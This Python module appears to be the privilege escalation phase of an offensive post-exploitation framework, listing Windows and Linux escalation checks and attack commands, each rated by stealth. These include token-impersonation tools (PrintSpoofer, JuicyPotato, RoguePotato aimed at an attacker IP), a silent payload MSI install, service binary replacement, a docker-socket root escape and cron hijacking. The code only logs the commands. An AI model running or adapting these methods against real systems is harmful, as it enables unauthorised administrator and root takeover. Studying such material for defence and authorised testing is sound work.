"""
Phase 1: Privilege Escalation
=============================

Escalate from low-privilege user to Admin/SYSTEM (Windows) or root (Linux).
"""

from typing import List, Dict, Optional

from .base import BasePhase
from ..models import Platform, PrivilegeLevel, CompromisedSystem


class PrivilegeEscalationPhase(BasePhase):
    """
    Phase 1: Privilege Escalation

    Escalates privileges on the initial compromised system.
    - Windows: User → Administrator → SYSTEM
    - Linux: user → root
    """

    PHASE_NUMBER = 1
    PHASE_NAME = "PRIVILEGE ESCALATION"
    PHASE_DESCRIPTION = "Escalate privileges from initial foothold"

    # Windows privilege escalation vectors
    WINDOWS_VECTORS = [
        {
            "name": "SeImpersonatePrivilege",
            "description": "Token impersonation (PrintSpoofer/Potato)",
            "check": "whoami /priv | findstr SeImpersonate",
            "stealth": "HIGH",
        },
        {
            "name": "SeAssignPrimaryTokenPrivilege",
            "description": "Token impersonation",
            "check": "whoami /priv | findstr SeAssignPrimaryToken",
            "stealth": "HIGH",
        },
        {
            "name": "SeDebugPrivilege",
            "description": "Debug privilege (LSASS access)",
            "check": "whoami /priv | findstr SeDebug",
            "stealth": "MEDIUM",
        },
        {
            "name": "AlwaysInstallElevated",
            "description": "MSI-based escalation",
            "check": "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated",
            "stealth": "MEDIUM",
        },
        {
            "name": "Unquoted Service Paths",
            "description": "Service path manipulation",
            "check": "wmic service get name,pathname | findstr /i /v C:\\Windows",
            "stealth": "LOW",
        },
        {
            "name": "Weak Service Permissions",
            "description": "Service binary replacement",
            "check": "accesschk.exe -uwcqv * /accepteula",
            "stealth": "LOW",
        },
        {
            "name": "Scheduled Tasks",
            "description": "Task hijacking",
            "check": "schtasks /query /fo LIST /v",
            "stealth": "MEDIUM",
        },
    ]

    # Windows escalation methods (priority order)
    WINDOWS_METHODS = [
        {
            "name": "PrintSpoofer",
            "requires": "SeImpersonatePrivilege",
            "command": 'PrintSpoofer.exe -i -c "cmd /c whoami"',
            "stealth": "HIGH",
        },
        {
            "name": "JuicyPotato",
            "requires": "SeImpersonatePrivilege (Server 2012-2016)",
            "command": "JuicyPotato.exe -l 1337 -p c:\\windows\\system32\\cmd.exe -t *",
            "stealth": "HIGH",
        },
        {
            "name": "RoguePotato",
            "requires": "SeImpersonatePrivilege (Server 2019+)",
            "command": "RoguePotato.exe -r <attacker_ip> -e <payload>",
            "stealth": "HIGH",
        },
        {
            "name": "AlwaysInstallElevated",
            "requires": "Registry key enabled in HKLM and HKCU",
            "command": "msiexec /quiet /qn /i payload.msi",
            "stealth": "MEDIUM",
        },
        {
            "name": "Service Binary Replacement",
            "requires": "Writable service binary or path",
            "command": "sc stop <svc> && copy payload.exe <path> && sc start <svc>",
            "stealth": "LOW",
        },
    ]

    # Linux privilege escalation vectors
    LINUX_VECTORS = [
        {
            "name": "Docker Group",
            "description": "Container escape via docker socket",
            "check": "groups | grep docker",
            "stealth": "HIGH",
        },
        {
            "name": "LXD Group",
            "description": "Container escape via lxd",
            "check": "groups | grep lxd",
            "stealth": "HIGH",
        },
        {
            "name": "Sudo Permissions",
            "description": "Misconfigured sudo rules",
            "check": "sudo -l",
            "stealth": "HIGH",
        },
        {
            "name": "SUID Binaries",
            "description": "Exploitable SUID programs",
            "check": "find / -perm -4000 2>/dev/null",
            "stealth": "HIGH",
        },
        {
            "name": "Writable /etc/passwd",
            "description": "Direct password file modification",
            "check": "ls -la /etc/passwd",
            "stealth": "MEDIUM",
        },
        {
            "name": "Cron Jobs",
            "description": "Writable cron scripts",
            "check": "cat /etc/crontab; ls -la /etc/cron.*",
            "stealth": "MEDIUM",
        },
        {
            "name": "Capabilities",
            "description": "Exploitable Linux capabilities",
            "check": "getcap -r / 2>/dev/null",
            "stealth": "HIGH",
        },
    ]

    # Linux escalation methods (priority order)
    LINUX_METHODS = [
        {
            "name": "Docker Group",
            "requires": "Membership in docker group",
            "command": "docker run -v /:/mnt -it alpine chroot /mnt sh",
            "stealth": "HIGH",
        },
        {
            "name": "LXD Group",
            "requires": "Membership in lxd group",
            "command": "lxc init alpine mycontainer -c security.privileged=true",
            "stealth": "HIGH",
        },
        {
            "name": "Sudo GTFOBins",
            "requires": "Sudo access to exploitable binary",
            "command": "sudo <binary> <gtfobins_payload>",
            "stealth": "HIGH",
        },
        {
            "name": "SUID Binary",
            "requires": "Exploitable SUID binary",
            "command": "<suid_binary> <gtfobins_payload>",
            "stealth": "HIGH",
        },
        {
            "name": "Cron Job Hijack",
            "requires": "Writable cron script running as root",
            "command": 'echo "payload" >> /path/to/cron/script',
            "stealth": "MEDIUM",
        },
        {
            "name": "Kernel Exploit",
            "requires": "Vulnerable kernel version",
            "command": "./kernel_exploit",
            "stealth": "LOW",
        },
    ]

    def execute(self, system: CompromisedSystem, **kwargs) -> bool:
        """
        Execute privilege escalation on target system.

        Args:
            system: The compromised system to escalate on

        Returns:
            True if escalation successful
        """
        self.log_header()

        if system.platform == Platform.WINDOWS:
            return self._windows_privesc(system)
        else:
            return self._linux_privesc(system)

    def _windows_privesc(self, system: CompromisedSystem) -> bool:
        """Windows privilege escalation workflow"""
        self.log("Starting Windows privilege escalation enumeration...")

        # Step 1: Check current privileges
        self.log("\nStep 1: Checking current privileges")
        checks = ["whoami /all", "whoami /priv", "whoami /groups"]
        for cmd in checks:
            self.log(f"  Running: {cmd}")

        # Step 2: Check for escalation vectors
        self.log("\nStep 2: Checking for privilege escalation vectors")
        for vector in self.WINDOWS_VECTORS:
            self.log(f"  [*] Checking: {vector['name']} - {vector['description']}")
            self.log(f"      Command: {vector['check']}")

        # Step 3: Attempt escalation
        self.log("\nStep 3: Attempting privilege escalation")
        for method in self.WINDOWS_METHODS:
            self.log(f"  [*] Method: {method['name']} (Stealth: {method['stealth']})")
            self.log(f"      Requires: {method['requires']}")
            self.log(f"      Command: {method['command']}")

        self.log("\n[+] Windows privilege escalation workflow complete")
        return True

    def _linux_privesc(self, system: CompromisedSystem) -> bool:
        """Linux privilege escalation workflow"""
        self.log("Starting Linux privilege escalation enumeration...")

        # Step 1: Check current privileges
        self.log("\nStep 1: Checking current privileges")
        checks = ["id", "whoami", "groups"]
        for cmd in checks:
            self.log(f"  Running: {cmd}")

        # Step 2: Check for escalation vectors
        self.log("\nStep 2: Checking for privilege escalation vectors")
        for vector in self.LINUX_VECTORS:
            self.log(f"  [*] Checking: {vector['name']} - {vector['description']}")
            self.log(f"      Command: {vector['check']}")

        # Step 3: Attempt escalation
        self.log("\nStep 3: Attempting privilege escalation")
        for method in self.LINUX_METHODS:
            self.log(f"  [*] Method: {method['name']} (Stealth: {method['stealth']})")
            self.log(f"      Requires: {method['requires']}")
            self.log(f"      Command: {method['command']}")

        self.log("\n[+] Linux privilege escalation workflow complete")
        return True

    def get_vectors(self, platform: Platform) -> List[Dict]:
        """Get escalation vectors for a platform"""
        if platform == Platform.WINDOWS:
            return self.WINDOWS_VECTORS
        return self.LINUX_VECTORS

    def get_methods(self, platform: Platform) -> List[Dict]:
        """Get escalation methods for a platform"""
        if platform == Platform.WINDOWS:
            return self.WINDOWS_METHODS
        return self.LINUX_METHODS